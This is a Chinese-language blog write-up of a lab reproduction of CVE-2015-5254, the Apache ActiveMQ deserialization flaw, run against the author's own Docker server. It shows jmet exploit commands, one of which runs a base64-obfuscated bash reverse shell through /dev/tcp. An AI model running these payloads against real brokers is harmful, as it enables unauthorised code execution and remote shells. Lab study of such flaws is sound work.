---
title: CVE-2015-5254
date: 2024-11-27 17:57:58
tags: target
categories: CVE
updated: 2024-11-27 17:57:58
---
# CVE-2015-5254
第一次写这个，玩一玩这个CVE，从老的开始学这个，这是一个反序列化漏洞
账户和密码默认admin/admin
## 漏洞描述
漏洞编号：CVE-2015-5254
影响版本：Apache ActiveMQ 5.13.0之前5.x版本，https://www.cvedetails.com/cve/CVE-2015-5254/
漏洞产生原因：该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

vulnP:110.41.22.24:8186
这是我自己的服务器，现在这个端口应该关了，我用完就关的，想玩的可以和我说哈，我给你开，就是个docker容器，打烂了都没用
hackIP:172.20.205.57

## 漏洞复现
这个漏洞具体是两个端口61616工作端口，消息传递，8161是管理页面

![](https://gitee.com/fogpost/photo/raw/master/202411271814424.png)
直接访问页面，发现是一个Apache ActiveMQ的CMS框架，由于是漏洞复现，我们能很清楚的知道它的版本。如果不知道版本可通过乱输入路径进行报错，或是使用云悉指纹识别进行版本检测.
>whatweb http://110.41.22.24:8161/  可以查看版本

![](https://gitee.com/fogpost/photo/raw/master/202411271821474.png)
[jmet](https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar)



>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 110.41.22.24 61616  
注意java版本要8及以下

![](https://gitee.com/fogpost/photo/raw/master/202411271853828.png)
我们实现在管理员界面引入一个event队列，查看这个消息
![](https://gitee.com/fogpost/photo/raw/master/202411271859064.png)  
![](https://gitee.com/fogpost/photo/raw/master/202411271900112.png)
点击任意一条消息触发，发现已经执行了命令，touch /tmp/success
![](https://gitee.com/fogpost/photo/raw/master/202411271907776.png)  
>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaT4vZGV2L3RjcC8xOTIuMTY4LjE4LjI0NC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" -Yp ROME 110.41.22.24 61616

![](https://gitee.com/fogpost/photo/raw/master/202411271911825.png)

在执行完这个时候管理员处会获得新的消息，这时点击便会反弹我们的shell
![](https://gitee.com/fogpost/photo/raw/master/202411271909000.png)
发现个事情，nc只能监听本地的接口，这个反弹shell有点问题由于我不是很会处理这个ip的转换，所以可能会有点问题，反弹shell也有点问题，看之后能不能在本地内网再来一次

## 总结
这个CVE需要诱导管理员点击的同时，还需要再内网中攻击可以说是比较拉跨了，但是攻击方式又相对简单，很容易复现，虽然难点再exp的编写上，什么时候要看看这个jar包的内容